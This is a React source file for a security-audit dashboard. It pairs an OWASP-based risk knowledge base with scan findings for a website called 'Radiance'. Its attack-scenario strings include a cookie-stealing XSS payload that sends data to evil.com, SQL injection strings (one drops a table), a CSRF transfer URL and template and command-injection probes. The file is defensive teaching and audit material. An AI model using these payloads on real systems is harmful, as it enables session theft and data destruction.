'use client';

import { useState } from 'react';
import {
  Shield, ShieldAlert, ShieldCheck, ShieldX, AlertTriangle, CheckCircle2,
  XCircle, Info, ChevronRight, Code, Bug, Lock, Eye, Database, Globe,
  FileWarning, Zap, Server, Package, Search, ClipboardList, RefreshCw,
} from 'lucide-react';

// ─────────────────────────────────────────────────────────────────────────────
// Types
// ─────────────────────────────────────────────────────────────────────────────

type Severity  = 'critical' | 'high' | 'medium' | 'low' | 'info';
type FindingStatus = 'fail' | 'warn' | 'pass' | 'na';

interface Finding {
  status: FindingStatus;
  title: string;
  detail: string;
  location?: string;   // "file:line"
  snippet?: string;    // relevant code
  fix?: string;
}

interface CodePattern {
  label: string;
  bad: string;
  good: string;
}

interface RiskCategory {
  id: string;
  name: string;
  owasp?: string;
  icon: React.ElementType;
  severity: Severity;
  description: string;
  attackScenario: string;
  howToCheck: string[];
  howToFix: string[];
  patterns?: CodePattern[];
  findings: Finding[];
}

// ─────────────────────────────────────────────────────────────────────────────
// Knowledge Base Data + Radiance Website Scan Results
// ─────────────────────────────────────────────────────────────────────────────

const RISK_CATEGORIES: RiskCategory[] = [
  {
    id: 'xss',
    name: 'Cross-Site Scripting (XSS)',
    owasp: 'A03:2021',
    icon: Code,
    severity: 'high',
    description:
      'XSS allows attackers to inject client-side scripts into pages viewed by other users. Stored XSS persists in the database; Reflected XSS comes from request parameters; DOM-based XSS is triggered via JavaScript.',
    attackScenario:
      'An attacker submits <script>fetch("https://evil.com?c="+document.cookie)</script> into a blog comment or form field. If the application renders it as HTML instead of text, every visitor who loads that page sends their session cookie to the attacker.',
    howToCheck: [
      'Search codebase for dangerouslySetInnerHTML, innerHTML, document.write, eval()',
      'Trace every user-supplied value to see if it reaches any DOM-writing API',
      'Check that error messages, API responses rendered in UI are escaped',
      'Test manually: submit <img src=x onerror=alert(1)> in every text field',
      'Use automated scanners: OWASP ZAP, Burp Suite active scan',
    ],
    howToFix: [
      'Never use dangerouslySetInnerHTML with user-supplied content — use react-markdown or a sanitizing library (DOMPurify)',
      'React auto-escapes JSX text expressions — always render user data as {variable} not via HTML injection',
      'Set Content-Security-Policy to block inline scripts: script-src \'self\' (remove unsafe-inline, unsafe-eval)',
      'Sanitize rich-text editor output with DOMPurify.sanitize() before storing or rendering',
      'Use HTTPOnly and Secure flags on cookies to reduce XSS session-hijack impact',
    ],
    patterns: [
      {
        label: 'Rendering HTML content',
        bad: "<div dangerouslySetInnerHTML={{ __html: userContent }} />",
        good: "import DOMPurify from 'dompurify';\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />",
      },
      {
        label: 'Displaying user input',
        bad: 'document.getElementById("msg").innerHTML = req.query.msg;',
        good: 'document.getElementById("msg").textContent = req.query.msg;',
      },
    ],
    findings: [
      {
        status: 'warn',
        title: 'dangerouslySetInnerHTML on blog article content',
        detail:
          'Article HTML is rendered directly. Currently safe because content is hardcoded, but if articles ever come from a CMS or database, this becomes a stored XSS vector.',
        location: 'radiance/blog/[slug]/page.tsx:552',
        snippet: 'dangerouslySetInnerHTML={{ __html: article.content }}',
        fix: "Replace with react-markdown or wrap with DOMPurify.sanitize() before rendering. Migrate article content to Markdown format.",
      },
      {
        status: 'pass',
        title: 'JSON-LD structured data (layout)',
        detail:
          'Uses dangerouslySetInnerHTML but content is generated via JSON.stringify() which escapes all HTML special characters. Safe.',
        location: 'radiance/layout.tsx:75',
        snippet: 'dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}',
      },
      {
        status: 'pass',
        title: 'Form error messages rendered as React text',
        detail: 'Error strings in contact/consultation forms are rendered as JSX text nodes — React auto-escapes them.',
        location: 'radiance/contact/page.tsx, radiance/consultation/page.tsx',
      },
    ],
  },

  {
    id: 'injection',
    name: 'Injection (SQL / Command / Template)',
    owasp: 'A03:2021',
    icon: Bug,
    severity: 'critical',
    description:
      'Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. SQL injection allows data theft or database manipulation. Command injection allows OS-level execution. Template injection allows server-side code execution.',
    attackScenario:
      "A contact form's `name` field is passed directly to a SQL query: SELECT * FROM contacts WHERE name='${name}'. Submitting `' OR '1'='1` dumps the entire table. Submitting `'; DROP TABLE contacts; --` destroys data.",
    howToCheck: [
      'Find all database queries — check if user input is concatenated into query strings',
      'Search for child_process.exec, eval, template engines (ejs/handlebars) that use user input',
      'Check that parameterized queries / prepared statements are used everywhere',
      'Test with SQLMap for automated SQL injection scanning',
      "Submit: ' OR 1=1 --, <%, {{7*7}}, $(id) in all text fields",
    ],
    howToFix: [
      'Use parameterized queries / prepared statements — never concatenate user input into SQL',
      'Use an ORM (Prisma, Drizzle, Sequelize) which parameterizes by default',
      'Never pass user input to child_process.exec() — use child_process.execFile() with args array',
      'Whitelist allowed values for fields like industry, serviceInterest (dropdown values)',
      'Validate and sanitize all inputs server-side regardless of frontend validation',
    ],
    patterns: [
      {
        label: 'SQL query construction',
        bad: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
        good: "db.query('SELECT * FROM users WHERE email = $1', [email])",
      },
      {
        label: 'Shell command execution',
        bad: "exec(`convert ${filename} output.png`)",
        good: "execFile('convert', [filename, 'output.png'])",
      },
    ],
    findings: [
      {
        status: 'pass',
        title: 'No SQL queries in Radiance API',
        detail:
          'The /api/radiance/contact endpoint uses in-memory storage only — no database calls, no injection surface.',
        location: 'index.js:3800–3930',
      },
      {
        status: 'pass',
        title: 'No shell/command execution in Radiance routes',
        detail: 'No child_process or eval() calls found in Radiance-related code.',
      },
      {
        status: 'pass',
        title: 'Input length-capped and trimmed',
        detail: 'All string fields are trimmed and sliced to max lengths before use.',
        location: 'index.js (checkRadianceRateLimit area)',
        snippet: "(name || '').trim().slice(0, 200)",
      },
    ],
  },

  {
    id: 'csrf',
    name: 'CSRF (Cross-Site Request Forgery)',
    owasp: 'A01:2021',
    icon: RefreshCw,
    severity: 'medium',
    description:
      'CSRF tricks an authenticated user\'s browser into making an unwanted request to a web application. The attack exploits the fact that the browser automatically includes cookies with every request to the target domain.',
    attackScenario:
      "A user is logged into example.com. Attacker's page has <img src='https://example.com/api/transfer?to=attacker&amount=1000'>. When the user visits the attacker's page, their browser sends the request with their session cookie, transferring funds.",
    howToCheck: [
      "Check all state-changing endpoints (POST/PUT/DELETE) for CSRF token validation",
      "Check cookie settings: SameSite=Strict or Lax blocks most CSRF attacks",
      "Check if Origin or Referer headers are validated",
      "Try submitting the form from a different domain — does it succeed?",
    ],
    howToFix: [
      "Add SameSite=Strict to all session cookies (best built-in protection)",
      "Implement CSRF tokens: generate per-session token, validate on every state-changing request",
      "Validate the Origin header against an allowlist on sensitive endpoints",
      "Use the csurf Express middleware for automatic CSRF token handling",
      "For APIs consumed only by your frontend, SameSite cookies + CORS restrictions are sufficient",
    ],
    patterns: [
      {
        label: 'Cookie settings',
        bad: "res.cookie('session', token)",
        good: "res.cookie('session', token, { sameSite: 'strict', httpOnly: true, secure: true })",
      },
    ],
    findings: [
      {
        status: 'warn',
        title: 'No CSRF tokens on contact form endpoint',
        detail:
          'POST /api/radiance/contact has no CSRF token validation. Impact is low because the site uses no session cookies — an attacker cannot act on behalf of an authenticated user. However, reCAPTCHA v3 now provides equivalent bot protection.',
        location: 'index.js:3804',
        fix: "Low priority given no auth cookies. If sessions are ever added, implement csurf middleware immediately.",
      },
      {
        status: 'pass',
        title: 'No session cookies used',
        detail: 'Radiance website has no login/session system, making classic CSRF attacks non-applicable. reCAPTCHA v3 prevents automated form abuse.',
      },
    ],
  },

  {
    id: 'input-validation',
    name: 'Input Validation & Ghost Forms',
    owasp: 'A04:2021',
    icon: ClipboardList,
    severity: 'medium',
    description:
      'Insufficient input validation allows malformed, oversized, or malicious data to reach the application. "Ghost forms" are UI forms that appear functional but never send data to a backend — silently losing user submissions.',
    attackScenario:
      "A contact form with no length limits on the message field is sent a 10MB string, consuming server memory. Separately, a lead generation form that looks real but only logs to console loses every lead — a business-critical failure.",
    howToCheck: [
      "Verify every form submits to a real API endpoint (check Network tab in DevTools)",
      "Check every string field for server-side max length enforcement",
      "Verify required fields are validated server-side (not just HTML required attribute)",
      "Check that email/phone fields are validated with regex on the server",
      "Test: submit empty required fields directly via curl to bypass frontend validation",
    ],
    howToFix: [
      "Wire all forms to a backend endpoint — never simulate success client-side only",
      "Enforce max lengths on all string fields server-side (.trim().slice(0, maxLen))",
      "Validate email format with a strict regex on the server",
      "Use a schema validation library (Zod, Joi, Yup) for structured API input validation",
      "Return meaningful errors for invalid inputs; log all form submissions",
    ],
    patterns: [
      {
        label: 'Server-side field sanitization',
        bad: "const { name, email, message } = req.body; // raw, unchecked",
        good: "const name = (req.body.name || '').trim().slice(0, 200);\nconst email = (req.body.email || '').trim().slice(0, 200);\nconst message = (req.body.message || '').trim().slice(0, 5000);",
      },
    ],
    findings: [
      {
        status: 'pass',
        title: 'Contact & consultation forms — server-side validation',
        detail: 'Both forms validate name/email/message as required, enforce field length caps, validate email format with regex, and trim all inputs.',
        location: 'index.js:3857–3895',
        snippet: "(name || '').trim().slice(0, 200)",
      },
      {
        status: 'pass',
        title: 'Dropdown fields validated against server-side whitelist',
        detail: 'serviceInterest, budget, and timeline are checked against explicit Set whitelists. Any value not in the allowed list returns 400. Prevents injection of arbitrary values through API manipulation.',
        location: 'index.js:3870–3882',
        snippet: "const VALID_SERVICE_INTEREST = new Set(['Public Relations', 'Events', ...]);\nif (!VALID_SERVICE_INTEREST.has(clean.serviceInterest)) {\n  return res.status(400).json({ error: 'Invalid service selection.' });\n}",
      },
      {
        status: 'fail',
        title: 'Lead-gen form is UI-only — data silently dropped',
        detail:
          'The lead-gen page handleSubmit only calls console.log() and setSubmitted(true). No data is sent to any backend. Users see a success message but their contact details are never received.',
        location: 'radiance/lead-gen/page.tsx:119–126',
        snippet: "const handleSubmit = (e) => {\n  e.preventDefault();\n  console.log('Form submitted:', formData);\n  setSubmitted(true);\n};",
        fix: "Wire to POST /api/radiance/contact with the same payload shape as the consultation form.",
      },
      {
        status: 'warn',
        title: 'Blog newsletter subscription — no backend',
        detail: 'The newsletter email form on the blog listing page is a placeholder with no backend integration. Subscriptions are silently lost.',
        location: 'radiance/blog/page.tsx',
        fix: "Implement a newsletter endpoint or integrate a third-party service (Mailchimp, Resend audiences).",
      },
    ],
  },

  {
    id: 'auth',
    name: 'Authentication & Authorization',
    owasp: 'A07:2021',
    icon: Lock,
    severity: 'high',
    description:
      'Broken authentication allows attackers to compromise passwords, keys, or session tokens to assume other users\' identities. Broken access control allows users to act outside their intended permissions — such as accessing admin data without being an admin.',
    attackScenario:
      "An admin endpoint GET /api/radiance/contact/submissions returns all contact form data. Without authentication, any person who knows the URL can dump all collected PII (names, emails, phone numbers, companies).",
    howToCheck: [
      "Find all API endpoints — check which ones require authentication",
      "Look for admin/management endpoints that return sensitive data",
      "Check if JWT tokens are validated (not just decoded)",
      "Test: access protected routes without a token — do they return data?",
      "Check for IDOR (Insecure Direct Object Reference): can user A access user B's data by changing an ID?",
    ],
    howToFix: [
      "Add authentication middleware to all sensitive routes",
      "Use JWT with short expiry + refresh tokens, or session-based auth with secure cookies",
      "Implement role-based access control (RBAC) for admin vs user routes",
      "Never trust client-provided IDs for access control — always check ownership server-side",
      "Return 401 for unauthenticated, 403 for unauthorized (not 404 to hide endpoint existence)",
    ],
    patterns: [
      {
        label: 'Protecting admin routes',
        bad: "app.get('/api/admin/submissions', async (req, res) => { /* no auth check */ })",
        good: "app.get('/api/admin/submissions', requireAuth, requireRole('admin'), async (req, res) => { ... })",
      },
    ],
    findings: [
      {
        status: 'warn',
        title: 'Submissions endpoint has no auth (currently 501)',
        detail:
          'GET /api/radiance/contact/submissions returns 501 Not Implemented — so no data is exposed now. But when it gets implemented, it MUST have authentication. It will contain all PII from contact form submissions.',
        location: 'index.js:3933',
        snippet: "app.get('/api/radiance/contact/submissions', async (req, res) => {\n  res.status(501).json({ error: 'Not yet implemented' });\n});",
        fix: "Before implementing: add requireAuth middleware. Consider an admin-only API key or JWT check.",
      },
      {
        status: 'pass',
        title: 'No public admin routes exposed',
        detail: 'No active admin routes for Radiance are currently accessible without auth.',
      },
    ],
  },

  {
    id: 'security-headers',
    name: 'Security Headers & CSP',
    owasp: 'A05:2021',
    icon: Server,
    severity: 'medium',
    description:
      'HTTP security headers tell browsers how to behave when handling your site\'s content. A weak Content-Security-Policy allows injected scripts to run. Missing headers enable clickjacking, MIME sniffing, and information leakage.',
    attackScenario:
      "Without X-Frame-Options, an attacker embeds your site in an <iframe> on a malicious page, overlays invisible click targets (clickjacking), and tricks users into submitting forms they can't see. A loose CSP with unsafe-inline allows injected <script> tags to execute.",
    howToCheck: [
      "Check response headers with: curl -I https://yoursite.com",
      "Use securityheaders.com to score your headers",
      "Check CSP for unsafe-inline, unsafe-eval in script-src — both weaken XSS protection",
      "Verify X-Frame-Options: DENY or SAMEORIGIN",
      "Check Strict-Transport-Security is present for HTTPS sites",
      "Look for missing: Permissions-Policy, Referrer-Policy",
    ],
    howToFix: [
      "Remove unsafe-inline and unsafe-eval from script-src — use nonces or hashes instead",
      "Add Referrer-Policy: strict-origin-when-cross-origin",
      "Add Permissions-Policy: camera=(), microphone=(), geolocation=()",
      "Use the helmet npm package to set all security headers automatically",
      "Test changes with CSP Evaluator (csp-evaluator.withgoogle.com)",
    ],
    patterns: [
      {
        label: 'Using helmet for all headers at once',
        bad: "app.use(express.json()); // no security headers",
        good: "const helmet = require('helmet');\napp.use(helmet({\n  contentSecurityPolicy: {\n    directives: {\n      scriptSrc: [\"'self'\"], // no unsafe-inline!\n    }\n  }\n}));",
      },
    ],
    findings: [
      {
        status: 'pass',
        title: 'HSTS (Strict-Transport-Security)',
        detail: 'max-age=31536000; includeSubDomains — correct.',
        location: 'index.js:20',
        snippet: "res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains')",
      },
      {
        status: 'pass',
        title: 'X-Frame-Options: DENY',
        detail: 'Prevents clickjacking. CSP also includes frame-ancestors: none for double protection.',
        location: 'index.js:22',
      },
      {
        status: 'pass',
        title: 'X-Content-Type-Options: nosniff',
        detail: 'Prevents MIME-type sniffing attacks.',
        location: 'index.js:21',
      },
      {
        status: 'warn',
        title: "CSP includes 'unsafe-inline' and 'unsafe-eval' in script-src",
        detail:
          "The Content-Security-Policy allows unsafe-inline and unsafe-eval in script-src. This significantly weakens XSS protection. Updated to explicitly allow reCAPTCHA domains (google.com/recaptcha, gstatic.com/recaptcha) and add frame-src for reCAPTCHA widget. Removing unsafe-inline requires nonce-based CSP.",
        location: 'index.js:23',
        snippet: "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/",
        fix: "Use Next.js nonce-based CSP. Set a per-request nonce in middleware and pass it to Next.js via headers. See: nextjs.org/docs/app/building-your-application/configuring/content-security-policy",
      },
      {
        status: 'pass',
        title: 'Referrer-Policy: strict-origin-when-cross-origin',
        detail: 'Referrer-Policy is set — browsers will only send the origin (not full URL) in cross-origin Referer headers, preventing URL parameter leakage to third parties.',
        location: 'index.js:24',
        snippet: "res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin')",
      },
      {
        status: 'pass',
        title: 'Permissions-Policy: restricts camera, mic, geo, payment',
        detail: 'Permissions-Policy is set, explicitly restricting browser APIs not needed by this site.',
        location: 'index.js:25',
        snippet: "res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), payment=()')",
      },
    ],
  },

  {
    id: 'rate-limiting',
    name: 'Rate Limiting & DoS Protection',
    owasp: 'A04:2021',
    icon: Zap,
    severity: 'medium',
    description:
      'Without rate limiting, attackers can flood forms with spam, exhaust server resources with large payloads, or enumerate valid emails by sending thousands of requests. Denial-of-service doesn\'t require sophisticated attacks — a simple script can saturate a small server.',
    attackScenario:
      "A competitor script sends 10,000 requests/minute to POST /api/radiance/contact with random data, saturating the server, filling logs, and making the site unresponsive for real visitors. Each request logs to console and allocates memory.",
    howToCheck: [
      "Check if rate limiting middleware (express-rate-limit, upstash) is applied to form endpoints",
      "Check the body size limit on express.json() — is 25MB necessary for a contact form?",
      "Test: send 100 rapid requests to the contact endpoint — are they blocked?",
      "Check if there's any IP-based throttling at the CDN/proxy level (Cloudflare, fly.io)",
    ],
    howToFix: [
      "Apply express-rate-limit per IP per time window on all public POST endpoints",
      "Reduce express.json() body limit for contact form endpoints (1kb is enough)",
      "Use reCAPTCHA v3 (already added) to block automated submissions",
      "Consider Cloudflare WAF / fly.io rate limiting at the edge for broader protection",
    ],
    patterns: [
      {
        label: 'Route-specific rate limit',
        bad: "app.post('/api/contact', async (req, res) => { /* no rate limit */ })",
        good: "const rateLimit = require('express-rate-limit');\nconst contactLimit = rateLimit({ windowMs: 15*60*1000, max: 5 });\napp.post('/api/contact', contactLimit, async (req, res) => { ... })",
      },
    ],
    findings: [
      {
        status: 'pass',
        title: 'Rate limiting on POST /api/radiance/contact',
        detail: 'In-memory rate limiter: 5 requests per IP per 15 minutes. Implemented and active.',
        location: 'index.js:3803–3818',
        snippet: "const radianceRateLimitMap = new Map();\n// max: 5 per 15 min per IP",
      },
      {
        status: 'warn',
        title: 'express.json() body limit is 25MB globally',
        detail:
          'The global body parser allows 25MB payloads. The contact form needs at most ~5KB. A large-body DoS attack could consume significant memory before rate limiting triggers.',
        location: 'index.js:16',
        snippet: "app.use(express.json({ limit: '25mb' }))",
        fix: "Add a smaller limit for Radiance routes: app.use('/api/radiance', express.json({ limit: '10kb' })) before the global middleware.",
      },
      {
        status: 'pass',
        title: 'reCAPTCHA v3 bot protection',
        detail: 'Added to both contact and consultation forms. Rejects requests with score < 0.5.',
      },
    ],
  },

  {
    id: 'info-disclosure',
    name: 'Information Disclosure',
    owasp: 'A05:2021',
    icon: Eye,
    severity: 'medium',
    description:
      'Applications sometimes leak sensitive information through error messages, API responses, HTTP headers, or debug outputs. Stack traces reveal internal paths and library versions. Verbose errors help attackers understand the system.',
    attackScenario:
      "A database connection error returns: \"Error: ECONNREFUSED 127.0.0.1:5432 at /home/app/node_modules/pg/lib/connection.js:54\" — revealing the internal file path, database engine, port, and that it's running locally. An attacker uses this to craft a targeted attack.",
    howToCheck: [
      "Trigger errors intentionally (send malformed JSON, invalid IDs) — check what error detail is returned",
      "Check response headers for X-Powered-By (reveals Express version)",
      "Search for console.log in API routes — check if it logs PII or sensitive data",
      "Verify NODE_ENV=production disables stack trace exposure",
      "Check if the Swagger /api-docs endpoint is publicly accessible",
    ],
    howToFix: [
      "Return only generic error messages to clients in production",
      "Log detailed errors server-side (with a logger like Pino or Winston) but never expose to client",
      "Disable X-Powered-By: app.disable('x-powered-by')",
      "Restrict /api-docs to internal/authenticated access in production",
      "Avoid logging PII (emails, names, IPs) to persistent logs unless required",
    ],
    patterns: [
      {
        label: 'Error handling',
        bad: "} catch (err) {\n  res.status(500).json({ error: err.message, stack: err.stack });\n}",
        good: "} catch (err) {\n  console.error('Internal error:', err); // server-side only\n  res.status(500).json({ error: 'An unexpected error occurred.' });\n}",
      },
    ],
    findings: [
      {
        status: 'pass',
        title: 'Generic error messages in API responses',
        detail: 'Contact form catch block returns only "Failed to process contact form. Please try again later." — no stack traces or internal details.',
        location: 'index.js:3925–3930',
      },
      {
        status: 'warn',
        title: 'Swagger UI (/api-docs) is publicly accessible',
        detail:
          'The Swagger documentation endpoint is mounted without authentication. It exposes all API routes, request schemas, and descriptions to anyone. In production, this should be restricted.',
        location: 'index.js (swagger setup)',
        fix: "Add IP allowlist or basic auth to /api-docs: app.use('/api-docs', basicAuth({ users: { admin: process.env.DOCS_PASSWORD } }), swaggerUi.serve, ...)",
      },
      {
        status: 'pass',
        title: 'PII (name, email) removed from server logs',
        detail: 'console.log now records only submission ID and timestamp — no names, emails, or company names in server logs. IP and userAgent are stored in the in-memory submission object only, not logged.',
        location: 'index.js:3915',
        snippet: "console.log('📧 New Radiance contact submission:', {\n  id: submission.id,\n  submittedAt: submission.submittedAt,\n});",
      },
    ],
  },

  {
    id: 'dependencies',
    name: 'Vulnerable Dependencies',
    owasp: 'A06:2021',
    icon: Package,
    severity: 'high',
    description:
      'Using components with known vulnerabilities is one of the most common attack vectors. npm packages are frequently found to contain security issues, and outdated versions may have unpatched CVEs that are publicly documented and exploited.',
    attackScenario:
      "axios@1.6.0 had a SSRF vulnerability (CVE-2023-45857) allowing credential leakage in redirect scenarios. An attacker who knows you use this version can craft a redirect that leaks internal API credentials in cross-origin requests.",
    howToCheck: [
      "Run: npm audit — shows all known CVEs in your dependency tree",
      "Run: npx npm-check-updates — shows outdated packages",
      "Check: nvd.nist.gov for specific package CVEs",
      "Set up automated dependency scanning (Dependabot, Snyk, GitHub Advanced Security)",
      "Run: npm outdated to see current vs latest versions",
    ],
    howToFix: [
      "Run npm audit fix to auto-patch non-breaking security updates",
      "Update critical packages manually: npm install package@latest",
      "Enable GitHub Dependabot alerts and auto-merge for patch updates",
      "Pin exact versions in package.json for production stability, update via Dependabot PRs",
      "Consider using Socket.dev for real-time supply chain attack detection",
    ],
    findings: [
      {
        status: 'warn',
        title: 'axios@^1.6.0 — potential SSRF vulnerability',
        detail:
          'axios 1.6.x had CVE-2023-45857 (credential forwarding in redirects). Current ^1.6.0 may resolve to a patched version but should be explicitly updated to 1.7+.',
        location: 'package.json',
        snippet: '"axios": "^1.6.0"',
        fix: "npm install axios@latest",
      },
      {
        status: 'warn',
        title: 'express@^4.19.0 — check for latest patch',
        detail:
          'Express 4.x has received security patches. 4.19 is not the latest — Express 4.21+ includes fixes. Recommend pinning to latest 4.x.',
        location: 'package.json',
        snippet: '"express": "^4.19.0"',
        fix: "npm install express@latest",
      },
      {
        status: 'warn',
        title: 'No helmet package — manual header setting',
        detail:
          'Security headers are set manually. helmet provides a more comprehensive, up-to-date set of headers including Permissions-Policy, Cross-Origin-* policies, and keeps up with browser security changes automatically.',
        location: 'index.js:18–24',
        fix: "npm install helmet && replace manual headers with app.use(helmet({ ... })) for more complete coverage.",
      },
      {
        status: 'info',
        title: 'Run npm audit for full vulnerability report',
        detail: 'A full npm audit was not run in this scan. Running `npm audit` will reveal all known CVEs in the dependency tree including transitive dependencies.',
        fix: "cd /home/user/5ml-agenticai-v1 && npm audit",
      },
    ],
  },

  {
    id: 'sensitive-data',
    name: 'Sensitive Data Exposure',
    owasp: 'A02:2021',
    icon: Database,
    severity: 'high',
    description:
      'Sensitive data — PII, credentials, financial data — must be encrypted at rest and in transit, never logged unnecessarily, and never returned to clients who shouldn\'t see it. Many breaches involve data that was stored or transmitted in cleartext.',
    attackScenario:
      "A contact form stores submissions in a plain JSON file with names, emails, and phone numbers. A path traversal vulnerability in an unrelated endpoint lets an attacker download the file, exporting all PII with no encryption.",
    howToCheck: [
      "Check all API responses — do they return more data than needed?",
      "Search for hardcoded credentials or API keys in source code (grep for 'secret', 'password', 'key')",
      "Check if form submissions are stored anywhere (file, DB, memory) and if it's encrypted",
      "Verify HTTPS is enforced (HSTS header, no HTTP fallback)",
      "Check .env files are gitignored and not committed",
    ],
    howToFix: [
      "Store sensitive data encrypted at rest (use database encryption or application-level encryption)",
      "Use environment variables for all credentials — never hardcode",
      "Implement data minimization: only collect fields that are actually needed",
      "Set HTTPS-only cookies: { secure: true, httpOnly: true }",
      "Consider GDPR compliance: provide data deletion capability for collected PII",
    ],
    findings: [
      {
        status: 'pass',
        title: 'HTTPS enforced via HSTS',
        detail: 'Strict-Transport-Security header forces HTTPS for 1 year including subdomains.',
        location: 'index.js:20',
      },
      {
        status: 'pass',
        title: 'No API keys in frontend code',
        detail: 'No hardcoded credentials found in Radiance frontend pages. NEXT_PUBLIC_ env vars used for public keys only.',
      },
      {
        status: 'warn',
        title: 'Contact submissions stored in-memory only',
        detail:
          'Form submissions are logged to console and stored in-memory. Data is lost on server restart and there is no audit trail. When database storage is implemented, ensure PII is stored with appropriate encryption and access controls.',
        location: 'index.js:3900–3910',
        fix: "Implement database storage with field-level encryption for sensitive PII, or use a hosted form service with built-in compliance.",
      },
    ],
  },

  {
    id: 'open-redirect',
    name: 'Open Redirect & Path Traversal',
    owasp: 'A01:2021',
    icon: Globe,
    severity: 'medium',
    description:
      'Open redirects allow attackers to use your domain as a trusted hop to redirect users to phishing sites. Path traversal allows reading files outside the intended directory by manipulating file paths with "../" sequences.',
    attackScenario:
      "https://trustedsite.com/redirect?url=https://evil.com — because it comes from a trusted domain, users and email filters trust it. Attackers use it in phishing emails to bypass URL scanners.",
    howToCheck: [
      "Search for res.redirect() — check if the URL is user-controlled",
      "Search for express.static() or fs.readFile() that use user input in paths",
      "Test: submit ?redirect=https://evil.com — does the app redirect there?",
      "Check: path.join(baseDir, userInput) — is the result validated to be within baseDir?",
    ],
    howToFix: [
      "Never use user input directly in res.redirect(). Use a whitelist of allowed paths.",
      "Validate redirect URLs are same-origin: url.startsWith('/') && !url.startsWith('//')",
      "Use path.resolve() and verify the result starts with the expected base directory",
      "Use express.static() with a fixed directory path, never with user-supplied path segments",
    ],
    findings: [
      {
        status: 'pass',
        title: 'No open redirect logic found',
        detail: 'No res.redirect() calls using user-supplied values found in Radiance routes. Navigation uses Next.js Link component with static hrefs.',
      },
      {
        status: 'pass',
        title: 'Static file serving uses fixed paths',
        detail: 'express.static() calls in index.js use hardcoded __dirname paths, not user input.',
      },
    ],
  },

  {
    id: 'recaptcha',
    name: 'Bot Protection & reCAPTCHA',
    owasp: 'A07:2021',
    icon: ShieldCheck,
    severity: 'medium',
    description:
      'Without bot protection, contact forms are abused for spam, credential stuffing, and DoS. reCAPTCHA v3 provides invisible bot scoring — no checkbox required. Submissions scoring below 0.5 are likely automated.',
    attackScenario:
      "A spam bot discovers the contact form endpoint and sends 500 fake submissions per hour with harvested business emails and promotional content. Inbox floods, legitimate leads are buried, and server resources are consumed.",
    howToCheck: [
      "Confirm NEXT_PUBLIC_RECAPTCHA_SITE_KEY is set and the script loads in browser DevTools > Sources",
      "Check Network tab: POST /api/radiance/contact should include recaptchaToken in body",
      "Confirm RECAPTCHA_SECRET_KEY is set on fly.io: fly secrets list",
      "Test: submit the form without the reCAPTCHA script loaded — expect 400 Security check failed",
      "Monitor reCAPTCHA admin console for score distribution",
    ],
    howToFix: [
      "Set fly.io secrets: fly secrets set RECAPTCHA_SECRET_KEY=xxx NEXT_PUBLIC_RECAPTCHA_SITE_KEY=yyy",
      "Add the site domain to Google reCAPTCHA admin console allowlist",
      "Consider adjusting score threshold (0.5) based on real traffic — lower = more permissive",
      "For high-value forms, consider reCAPTCHA Enterprise for more detailed signal analysis",
    ],
    findings: [
      {
        status: 'pass',
        title: 'reCAPTCHA v3 integrated in contact form',
        detail: 'Script loads on mount, token executed with action="contact", included in POST body, verified server-side (score ≥ 0.5).',
        location: 'radiance/contact/page.tsx',
      },
      {
        status: 'pass',
        title: 'reCAPTCHA v3 integrated in consultation form',
        detail: 'Same implementation as contact form with action="consultation".',
        location: 'radiance/consultation/page.tsx',
      },
      {
        status: 'warn',
        title: 'Lead-gen form has no reCAPTCHA (also has no backend)',
        detail: 'The lead-gen form is currently UI-only. When wired to the backend, reCAPTCHA must be added simultaneously.',
        location: 'radiance/lead-gen/page.tsx',
        fix: "Wire form to /api/radiance/contact first, then apply the same reCAPTCHA pattern from contact/page.tsx.",
      },
      {
        status: 'pass',
        title: 'reCAPTCHA secret key sent in POST body, not URL',
        detail: 'The siteverify request uses application/x-www-form-urlencoded POST body. The secret key is never in the URL, preventing it from appearing in proxy logs, fly.io access logs, or browser history.',
        location: 'index.js:3843–3849',
        snippet: "fetch('https://www.google.com/recaptcha/api/siteverify', {\n  method: 'POST',\n  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },\n  body: new URLSearchParams({ secret: process.env.RECAPTCHA_SECRET_KEY, response: recaptchaToken }).toString(),\n})",
      },
      {
        status: 'warn',
        title: 'Keys not yet configured — reCAPTCHA will silently skip if unset',
        detail: 'If RECAPTCHA_SECRET_KEY is not set in fly.io secrets, verification is bypassed entirely. The backend skips validation when the env var is absent.',
        location: 'index.js:3836',
        snippet: "if (process.env.RECAPTCHA_SECRET_KEY) { ... verify ... }",
        fix: "Run: fly secrets set RECAPTCHA_SECRET_KEY=<your_secret> NEXT_PUBLIC_RECAPTCHA_SITE_KEY=<your_site_key>",
      },
    ],
  },
];

// ─────────────────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────────────────

function categoryStatus(cat: RiskCategory): FindingStatus {
  const statuses = cat.findings.map(f => f.status);
  if (statuses.includes('fail')) return 'fail';
  if (statuses.includes('warn')) return 'warn';
  if (statuses.every(s => s === 'pass' || s === 'na')) return 'pass';
  return 'na';
}

const SEVERITY_COLOR: Record<Severity, string> = {
  critical: 'text-red-400 bg-red-400/10 border-red-400/20',
  high:     'text-orange-400 bg-orange-400/10 border-orange-400/20',
  medium:   'text-yellow-400 bg-yellow-400/10 border-yellow-400/20',
  low:      'text-blue-400 bg-blue-400/10 border-blue-400/20',
  info:     'text-slate-400 bg-slate-400/10 border-slate-400/20',
};

const STATUS_STYLES: Record<FindingStatus, { icon: React.ElementType; color: string; label: string }> = {
  fail: { icon: XCircle,      color: 'text-red-400',    label: 'FAIL' },
  warn: { icon: AlertTriangle,color: 'text-yellow-400', label: 'WARN' },
  pass: { icon: CheckCircle2, color: 'text-green-400',  label: 'PASS' },
  na:   { icon: Info,         color: 'text-slate-500',  label: 'N/A'  },
};

function StatusBadge({ status, size = 'sm' }: { status: FindingStatus; size?: 'sm' | 'xs' }) {
  const { icon: Icon, color, label } = STATUS_STYLES[status];
  return (
    <span className={`flex items-center gap-1 font-mono font-bold ${color} ${size === 'xs' ? 'text-[10px]' : 'text-xs'}`}>
